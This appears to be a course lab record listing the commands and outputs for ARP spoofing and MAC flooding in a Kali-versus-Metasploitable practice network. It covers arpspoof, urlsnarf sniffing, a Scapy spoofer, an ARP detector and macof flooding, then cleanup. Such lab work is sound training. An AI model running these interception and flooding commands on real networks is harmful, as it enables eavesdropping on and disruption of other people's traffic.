# Commands Used – Chapter 2

## 1. Identify Hosts

From Kali:

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

Observed:

```text
192.168.1.1      OPNsense gateway
192.168.1.121    Metasploitable victim
```

## 2. Enable IP Forwarding on Kali

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```

Expected result:

```text
1
```

## 3. Start Manual ARP Spoofing

From Kali terminal 1:

```bash
sudo arpspoof -i eth0 -t 192.168.1.121 192.168.1.1
```

From Kali terminal 2:

```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.121
```

## 4. Start urlsnarf

From Kali terminal 3:

```bash
sudo urlsnarf -i eth0
```

Observed:

```text
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
```

## 5. Generate HTTP Traffic from Metasploitable

```bash
wget http://192.168.1.1
```

Result:

```text
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://192.168.1.1/
```

The HTTPS follow-up failed because Metasploitable is old and does not support the gateway's modern TLS configuration. The important part for this lab was the initial HTTP request to port 80.

## 6. Validate with tcpdump

```bash
sudo tcpdump -i eth0 host 192.168.1.121 and port 80
```

Captured proof:

```text
192.168.1.121 > OPNsense.internal.http
HTTP: GET / HTTP/1.0
```

## 7. Inspect the Victim ARP Table

On Metasploitable:

```bash
arp -a
```

Poisoned ARP table evidence:

```text
OPNsense.internal (192.168.1.1) at 08:00:27:8A:35:D2 [ether] on eth0
? (192.168.1.188) at 08:00:27:8A:35:D2 [ether] on eth0
```

## 8. Run the Python Scapy ARP Spoofer

From Kali:

```bash
cd ~/ethical-hacking/chapter-02
sudo python3 arp_spoofer.py
```

## 9. Run the Python ARP Detector

From Kali:

```bash
cd ~/ethical-hacking/chapter-02
sudo python3 arpdetector.py
```

## 10. MAC Flooding with macof

Confirm `macof` is installed:

```bash
which macof
```

Output:

```text
/usr/bin/macof
```

Start a capture showing Ethernet headers:

```bash
sudo tcpdump -i eth0 -e -n
```

Run a limited MAC flooding test:

```bash
sudo macof -i eth0 -n 50
```

Capture summary:

```text
492 packets captured
492 packets received by filter
0 packets dropped by kernel
```

## 11. Cleanup

Stop running tools with:

```text
Ctrl+C
```

Turn IP forwarding back off:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```

Expected result:

```text
0
```
